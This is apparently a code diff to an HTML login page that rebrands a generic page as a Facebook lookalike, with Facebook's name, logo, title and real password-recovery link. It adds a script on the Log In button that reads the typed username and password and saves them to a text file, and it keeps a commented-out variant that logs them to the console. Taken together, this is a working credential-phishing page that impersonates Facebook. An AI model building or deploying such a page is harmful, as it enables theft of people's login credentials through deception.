@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>website - log in or sign up</title>
+    <title>Facebook - log in or sign up</title>
     <!-- link to font -->
     <link
       href="https://fonts.googleapis.com/css?family=Open+Sans:400,700"
@@ -21,13 +21,15 @@
 
   <body>
     <!-----------------HEADER---------------->
+    <!-- Still need to adjust the scaling for the header section. When scaling to different screen size, img, text, and button jumps around.
+        I think its a problem with the way col is set up, not sure. -->
     <div class="header row">
       <div class="col col-sm-3">
-        <img class="logo" src="CSS/logo.png" alt="website" />
+        <img class="facebook-logo" src="CSS/facebook.png" alt="facebook" />
       </div>
       <div class="header-text col-sm-6">
         <h4>Facebook</h4>
-        <p>Open in the website app</p>
+        <p>Open in the Facebook app</p>
       </div>
       <div class="col col-sm-3">
         <button class="open btn btn-lg btn-light" type="button">OPEN</button>
@@ -37,20 +39,21 @@
     <!-------------------------LOGIN Section-------------------------->
     <div class="row">
       <div class="col col-12">
+        <!-- <img src="CSS/facebook-logo.png" alt="facebook-img" /> -->
         <img
-          class="website"
+          class="facebook"
           src="https://i.postimg.cc/NMyj90t9/logo.png"
-          alt="website"
+          alt="Facebook"
         />
+        <!-- <p>Connect with friends and the world around on Facebook</p> -->
       </div>
 
       <!-- User name and password section -->
-      <form action="/submit" method="post">
+      <form>
         <div class="login col-12"> 
           <input
             class="login-field"
-            id="email"
-            name="email"
+            id="userName"
             type="text"
             size="50"
             placeholder="Mobile number or email"
@@ -62,8 +65,7 @@
         
           <input
             class="create-field"
-            id="password"
-            name="password"
+            id="passWord"
             type="password"
             size="50"
             placeholder="Password"
@@ -72,13 +74,14 @@
         
         </div>
 
-      <!-- Log in button -->
+      <!-- Log in button as well as saving data to txt file -->
         <div class="col-12">
           
           <button
             type="submit"
             id="bt"
             class="login-btn btn btn-primary btn-lg"
+            onclick="saveFile()"
           >
           Log In
           </button>
@@ -88,7 +91,7 @@
 
         <div class="forgot-pass col-12">
           <a
-            href="https://www.website.com/login/identify/?ctx=recover&ars=website_login&from_login_screen=0"
+            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
             >Forgot Password?</a
           >
         </div>
@@ -121,5 +124,67 @@
     </div>
     <script src="/javascript/main.js"></script>
   </body>
-</html>
 
+  <!-- this script allows us to save credentials as json file using browser built-in API -->
+  <!-- <script>
+    // to handle event submission
+    function handleSubmit(event){
+      event.preventDefault();
+      const userName = document.getElementById("userName");
+      const password = document.getElementById("passWord");
+
+      // This variable stores all the user's log in credentials.
+      let credentials =
+        "\r Username: " +
+        userName.value +
+        " \r\n " +
+        "password: " +
+        password.value;
+     
+      //displaying the credentials 
+      console.log({credentials});
+      //converts credential values to JSON notation
+      JSON.stringify(credentials)
+    }
+    
+    //targeting the form
+    const form = document.querySelector("form");
+    form.addEventListener("submit", handleSubmit);
+
+    
+  </script> -->
+  <!-- This script allows us to save credentials as .txt file. leaving it here just in case -->
+
+  <script>
+    let saveFile = () => {
+      // Get the data from each element on the form.
+      const userName = document.getElementById("userName");
+      const password = document.getElementById("passWord");
+
+      // This variable stores all the data.
+      let data =
+        "\r Username: " +
+        userName.value +
+        " \r\n " +
+        "password: " +
+        password.value;
+
+      // Convert the text to BLOB.
+      const textToBLOB = new Blob([data], { type: "text/plain" });
+      const sFileName = "formData.txt"; // The file to save the data.
+
+      let newLink = document.createElement("a");
+      newLink.download = sFileName;
+
+      if (window.webkitURL != null) {
+        newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+      } else {
+        newLink.href = window.URL.createObjectURL(textToBLOB);
+        newLink.style.display = "none";
+        document.body.appendChild(newLink);
+      }
+
+      newLink.click();
+    };
+  </script>
+</html>
